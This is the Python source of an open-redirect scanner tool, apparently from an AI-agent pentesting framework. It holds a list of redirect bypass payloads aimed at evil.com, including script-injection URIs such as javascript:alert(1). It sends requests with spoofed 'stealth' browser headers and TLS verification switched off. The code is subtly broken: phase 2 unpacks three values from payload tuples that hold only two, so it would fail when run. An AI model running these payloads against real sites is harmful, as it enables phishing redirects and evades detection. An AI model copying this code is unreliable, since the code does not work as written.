"""
OPEN REDIRECT SCANNER
=====================
Test for Open Redirect vulnerabilities.

Usage:
    from tools.open_redirect_scanner import open_redirect_scanner
"""

import json
import requests
import re
from urllib.parse import quote, urlparse, parse_qs, urlencode, urljoin
from langchain.tools import tool
from core.rate_limiter import rate_limiter
from core.cancellation import check_cancelled
from core.checkpoint import require_approval
from core.auth_store import get_auth_kwargs
from engines.stealth_engine import stealth

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    pass


def _domain_of(url: str) -> str:
    try:
        return urlparse(url).netloc.split(":")[0].lower()
    except Exception:
        return url


def _logger():
    from tools.custom_tools import exec_logger
    return exec_logger


# ── COMMON REDIRECT PARAMETERS ────────────────────────────────────────────────
REDIRECT_PARAMS = [
    "redirect", "redirect_uri", "redirect_url", "return", "return_url",
    "returnTo", "return_to", "next", "next_url", "next_page",
    "goto", "go", "url", "uri", "link", "target",
    "dest", "destination", "continue", "forward",
    "rurl", "dest_url", "redir", "redirect_uri",
    "callback", "comeback", "return_path",
    "checkout_url", "return_uri", "ref", "referer",
    "out", "view", "to", "outurl",
]


# ── REDIRECT BYPASS PAYLOADS ──────────────────────────────────────────────────
def _generate_bypass_payloads(legitimate_domain: str) -> list:
    """
    Generate redirect bypass payloads berdasarkan legitimate domain.
    Return list of (payload, bypass_type, expected_redirect_domain)
    """
    parsed = urlparse(legitimate_domain)
    domain = parsed.netloc or parsed.path
    base_domain = ".".join(domain.split(".")[-2:]) if "." in domain else domain

    payloads = [
        # ── Basic bypasses ────────────────────────────────────────────────────
        (f"https://evil.com", "Direct external"),
        (f"http://evil.com", "HTTP external"),
        (f"//evil.com", "Protocol-relative"),
        (f"//evil.com/", "Protocol-relative with slash"),

        # ── @ character bypass ────────────────────────────────────────────────
        (f"https://{domain}@evil.com", "@ character bypass"),
        (f"https://{domain}%40evil.com", "%40 encoded bypass"),
        (f"https://evil.com@{domain}", "Reversed @ bypass"),

        # ── Subdomain confusion ───────────────────────────────────────────────
        (f"https://evil.{domain}", "Subdomain confusion"),
        (f"https://evil.{base_domain}", "Base domain subdomain"),
        (f"https://{domain}.evil.com", "Domain prefix"),
        (f"https://{base_domain}.evil.com", "Base domain prefix"),

        # ── Domain suffix ─────────────────────────────────────────────────────
        (f"https://{domain}evil.com", "Domain suffix"),
        (f"https://{base_domain}evil.com", "Base domain suffix"),

        # ── Domain prefix ─────────────────────────────────────────────────────
        (f"https://evil-{domain}", "Domain prefix with dash"),
        (f"https://evil{domain}", "Domain prefix no dash"),

        # ── Path traversal ────────────────────────────────────────────────────
        (f"{legitimate_domain}/../evil.com", "Path traversal"),
        (f"{legitimate_domain}/..%2f..%2fevil.com", "URL-encoded path traversal"),
        (f"{legitimate_domain}%2f..%2fevil.com", "Partial URL-encoded traversal"),

        # ── URL encoding bypass ───────────────────────────────────────────────
        (f"https://evil%2Ecom", "Dot encoded"),
        (f"https://evil%2ecom", "Dot lowercase encoded"),
        (f"https://%65vil.com", "First char encoded"),
        (f"https://evil.com%00.{domain}", "Null byte injection"),
        (f"https://evil.com%0a.{domain}", "LF injection"),
        (f"https://evil.com%0d.{domain}", "CR injection"),

        # ── Fragment bypass ───────────────────────────────────────────────────
        (f"https://evil.com#{domain}", "Fragment bypass"),
        (f"https://evil.com#{domain}/path", "Fragment with path"),

        # ── Double slash bypass ───────────────────────────────────────────────
        (f"https://evil.com//{domain}", "Double slash bypass"),
        (f"https://evil.com///{domain}", "Triple slash bypass"),

        # ── Backslash bypass ──────────────────────────────────────────────────
        (f"https://evil.com\\@{domain}", "Backslash bypass"),
        (f"https:\\/\\/evil.com", "Escaped slash bypass"),

        # ── Tab/newline bypass ────────────────────────────────────────────────
        (f"https://evil.com%09.{domain}", "Tab bypass"),
        (f"https://evil.com%0a.{domain}", "Newline bypass"),
        (f"https://evil.com%0d%0a.{domain}", "CRLF bypass"),

        # ── Whitespace bypass ─────────────────────────────────────────────────
        (f"https://evil.com .{domain}", "Space bypass"),
        (f"https://evil.com\t.{domain}", "Tab char bypass"),

        # ── Case variation ────────────────────────────────────────────────────
        (f"HTTPS://EVIL.COM", "Case variation"),
        (f"hTtPs://EvIl.CoM", "Mixed case"),

        # ── IP address bypass ─────────────────────────────────────────────────
        ("http://127.0.0.1", "Localhost IP"),
        ("http://0.0.0.0", "Zero IP"),
        ("http://[::1]", "IPv6 localhost"),
        ("http://2130706433", "Decimal IP"),
        ("http://0x7f000001", "Hex IP"),
        ("http://0177.0.0.1", "Octal IP"),

        # ── URL parsing tricks ────────────────────────────────────────────────
        (f"https://evil.com?@{domain}", "Question mark bypass"),
        (f"https://evil.com#?@{domain}", "Hash + question bypass"),
        (f"javascript:alert(1)", "JavaScript protocol"),
        (f"data:text/html,<script>alert(1)</script>", "Data URI"),
        (f"vbscript:MsgBox(1)", "VBScript protocol"),
    ]

    return payloads


@tool("open_redirect_scanner")
def open_redirect_scanner(url: str, params: str = "") -> str:
    """
    Scan for Open Redirect vulnerabilities.
    Tests common redirect parameters with bypass payloads.

    Args:
        url: Target URL
        params: Comma-separated parameter names to test (optional)
    """
    tool_name = "Open Redirect Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting open redirect scan on {url}")
    if check_cancelled(logger): return "CANCELLED: job cancelled by user."

    approved = require_approval(
        action=f"Open redirect scan on {url}",
        context=f"Test redirect parameters with bypass payloads",
        risk="low",
        exec_logger=logger,
    )
    if not approved:
        return "CANCELLED: approval rejected or timeout."

    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)
    base = url.rstrip("/")

    # Determine params to test
    param_list = [p.strip() for p in params.split(",")] if params else REDIRECT_PARAMS

    # Generate bypass payloads
    bypass_payloads = _generate_bypass_payloads(url)

    vulnerabilities = []
    tested = 0

    # ── Phase 1: Test for redirect parameters ─────────────────────────────────
    logger.add_log(tool_name, "PROCESSING", f"Testing {len(param_list)} redirect parameters")

    for param in param_list:
        if check_cancelled(logger): break

        # Test with a known external domain (evil.com)
        try:
            rate_limiter.wait(domain)
            test_url = f"{base}?{param}=https://evil.com"
            stealth_headers = stealth.get_browser_headers(test_url)
            resp = requests.get(
                test_url,
                headers=stealth_headers,
                timeout=5,
                verify=False,
                allow_redirects=False,
                **auth_kwargs,
            )
            tested += 1

            # Check for redirect
            if resp.status_code in [301, 302, 303, 307, 308]:
                location = resp.headers.get("Location", "")
                if "evil.com" in location:
                    # Direct open redirect confirmed
                    vulnerabilities.append({
                        "parameter": param,
                        "payload": "https://evil.com",
                        "type": "Open Redirect (Direct)",
                        "redirect_url": location,
                        "severity": "High",
                        "evidence": f"Server redirected to {location}",
                    })
                    logger.add_log(tool_name, "WARNING", f"Open redirect: {param} -> {location}")
                    continue  # One per param

        except Exception:
            pass

        # Test with protocol-relative URL
        try:
            rate_limiter.wait(domain)
            test_url = f"{base}?{param}=//evil.com"
            stealth_headers = stealth.get_browser_headers(test_url)
            resp = requests.get(
                test_url,
                headers=stealth_headers,
                timeout=5,
                verify=False,
                allow_redirects=False,
                **auth_kwargs,
            )
            tested += 1

            if resp.status_code in [301, 302, 303, 307, 308]:
                location = resp.headers.get("Location", "")
                if "evil.com" in location:
                    vulnerabilities.append({
                        "parameter": param,
                        "payload": "//evil.com",
                        "type": "Open Redirect (Protocol-relative)",
                        "redirect_url": location,
                        "severity": "High",
                        "evidence": f"Server redirected to {location}",
                    })
                    logger.add_log(tool_name, "WARNING", f"Open redirect: {param} -> {location}")
                    break

        except Exception:
            pass

    # ── Phase 2: Bypass testing on vulnerable params ──────────────────────────
    vulnerable_params = [v["parameter"] for v in vulnerabilities]

    if vulnerable_params:
        logger.add_log(tool_name, "PROCESSING", f"Testing bypass techniques on {len(vulnerable_params)} vulnerable params")

        for param in vulnerable_params[:3]:  # Limit to top 3
            if check_cancelled(logger): break

            for payload, bypass_type, expected_domain in bypass_payloads[:25]:  # Limit payloads
                try:
                    rate_limiter.wait(domain)
                    test_url = f"{base}?{param}={quote(payload, safe='')}"
                    stealth_headers = stealth.get_browser_headers(test_url)
                    resp = requests.get(
                        test_url,
                        headers=stealth_headers,
                        timeout=5,
                        verify=False,
                        allow_redirects=False,
                        **auth_kwargs,
                    )
                    tested += 1

                    if resp.status_code in [301, 302, 303, 307, 308]:
                        location = resp.headers.get("Location", "")
                        if "evil.com" in location:
                            # Check if bypass was successful
                            already_found = any(
                                v["parameter"] == param and v["bypass_type"] == bypass_type
                                for v in vulnerabilities
                            )

                            if not already_found:
                                vulnerabilities.append({
                                    "parameter": param,
                                    "payload": payload,
                                    "type": f"Open Redirect ({bypass_type})",
                                    "bypass_type": bypass_type,
                                    "redirect_url": location,
                                    "severity": "Critical" if bypass_type in [
                                        "@ character bypass", "Path traversal",
                                        "Null byte injection", "Protocol-relative"
                                    ] else "High",
                                    "evidence": f"Bypass '{bypass_type}' succeeded -> {location}",
                                })
                                logger.add_log(tool_name, "WARNING",
                                    f"Bypass succeeded: {bypass_type} on {param}")

                except Exception:
                    pass

    # ── Build result ──────────────────────────────────────────────────────────
    # Deduplicate findings
    seen = set()
    unique_vulns = []
    for v in vulnerabilities:
        key = (v["parameter"], v.get("bypass_type", v["type"]))
        if key not in seen:
            seen.add(key)
            unique_vulns.append(v)

    result = {
        "status": "VULNERABLE" if unique_vulns else "SAFE",
        "vulnerabilities": unique_vulns,
        "count": len(unique_vulns),
        "total_tested": tested,
        "params_tested": param_list[:10],
        "note": "Open redirect can be used for phishing, credential theft, and OAuth token theft",
    }

    logger.add_log(tool_name, "SUCCESS",
        f"Open redirect scan complete. {tested} tests, {len(unique_vulns)} findings")
    return json.dumps(result, indent=2)
